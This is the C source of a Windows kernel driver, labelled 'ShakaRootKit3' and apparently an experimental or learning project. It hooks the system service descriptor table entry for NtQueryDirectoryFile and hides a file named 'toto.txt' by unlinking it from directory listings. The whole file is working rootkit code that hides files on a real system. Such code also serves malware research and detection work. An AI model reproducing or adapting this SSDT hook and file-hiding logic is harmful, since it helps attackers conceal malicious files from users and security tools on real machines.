#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook" 

// Rootkit: C:\ShakaRootKit3\objchk_win7_x86\i386\shakadriver.sy

#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable; // symbole exporte par le noyau pour lire la ssdt

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
int IsHooked;

typedef struct ProcessInformation{
	ULONG pid;
	ULONG ppid;
	UCHAR *name;
	PUNICODE_STRING pathname;
} ProcessInformation;


NTSTATUS ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI NtQueryDirectoryFile(

);

typedef NTSTATUS (*NTQUERYDIRECTORYFILE)(  
  	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
);


NTQUERYDIRECTORYFILE OldNtQueryDirectoryFile;

PVOID getProcessName(HANDLE ProcessHandle)
{	
	ULONG ret;
	NTSTATUS rc_zw;
	PVOID unicode;
	UNICODE_STRING name;

	rc_zw = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, NULL, 0, &ret);
	if (rc_zw == STATUS_INFO_LENGTH_MISMATCH)
	{
		unicode = ExAllocatePoolWithTag(PagedPool, ret, 'Efe');
		if (unicode != NULL)
		{
			rc_zw = ZwQueryInformationProcess(ProcessHandle, ProcessImageFileName, unicode, ret, &ret);
			if (NT_SUCCESS(rc_zw))
			{
				return unicode;
			}
		}
	}
	return NULL;
}


NTSTATUS NewNtQueryDirectoryFile(
  	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
)
{
	PFILE_ID_BOTH_DIR_INFORMATION fileIdBothDirInformation, precedentFileIdBothDirInformation;
	UNICODE_STRING filename;
	NTSTATUS rc;
	ULONG offset = 0; 
	UNICODE_STRING fileToHideName;

	rc = (*OldNtQueryDirectoryFile) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan
	);
	

	RtlInitUnicodeString(&fileToHideName, L"toto.txt"); 
	DbgPrint("#=== ShakaHook NtQueryDirectoryFile ===#\n");
	DbgPrint("FileInformationClass: %d\n", FileInformationClass);
	
	switch (FileInformationClass)
	{
		/*case 12: // _FILE_NAMES_INFORMATION 
			pFI = (PFILE_NAMES_INFORMATION) FileInformation;			filename.Length = ((PFILE_NAMES_INFORMATION) pFI)->FileNameLength;
			filename.Buffer = ((PFILE_NAMES_INFORMATION) pFI)->FileName;
			DbgPrint("filename %wZ\n", filename);
			break;
			*/
		case 37: // FILE_ID_BOTH_DIR_INFORMATION 
			DbgPrint("FILE_ID_BOTH_DIR_INFORMATION \n");

			precedentFileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
			offset += (ULONG) (precedentFileIdBothDirInformation->NextEntryOffset);
			
			do
			{
				fileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
				filename.Length = fileIdBothDirInformation->FileNameLength;
				filename.Buffer = (PWSTR)(fileIdBothDirInformation->FileName);

				// DbgPrint("offset %ld, filename %wZ \n", offset, &filename);
				// DbgPrint("%wZ == %wZ \n", &filename, &fileToHideName);
				if (RtlCompareUnicodeString(&filename, &fileToHideName, TRUE) == 0)
				{
					if (fileIdBothDirInformation->NextEntryOffset == 0)
					{
						DbgPrint("Hiding (last) %wZ \n", &filename);
						precedentFileIdBothDirInformation->NextEntryOffset = 0;
					}
					else
					{
						DbgPrint("Hiding (not last) %wZ \n", &filename);
						precedentFileIdBothDirInformation->NextEntryOffset += fileIdBothDirInformation->NextEntryOffset;
					}
				}
				offset += (ULONG) (fileIdBothDirInformation->NextEntryOffset);
				precedentFileIdBothDirInformation = fileIdBothDirInformation;

			} while(fileIdBothDirInformation->NextEntryOffset != 0 && offset < Length);
			
			break;
	}
	return rc;
}


NTSTATUS Hook_Function()
{
	g_pmdlSystemCall = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldNtQueryDirectoryFile = (PVOID) InterlockedExchange(  
			(PLONG) &MappedSystemCallTable[223], 
			(LONG) NewNtQueryDirectoryFile
		);
		IsHooked = 1; 
		DbgPrint("DriverEntry: Hook success");
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}

 
void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( 
			(PLONG) &MappedSystemCallTable[223],
			(LONG) OldNtQueryDirectoryFile
		);
		IsHooked = 0;
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}
 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	if(IsHooked)
		Unhook_fonction();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master 3\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;

	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;

	Hook_Function();

	return STATUS_SUCCESS;	
}

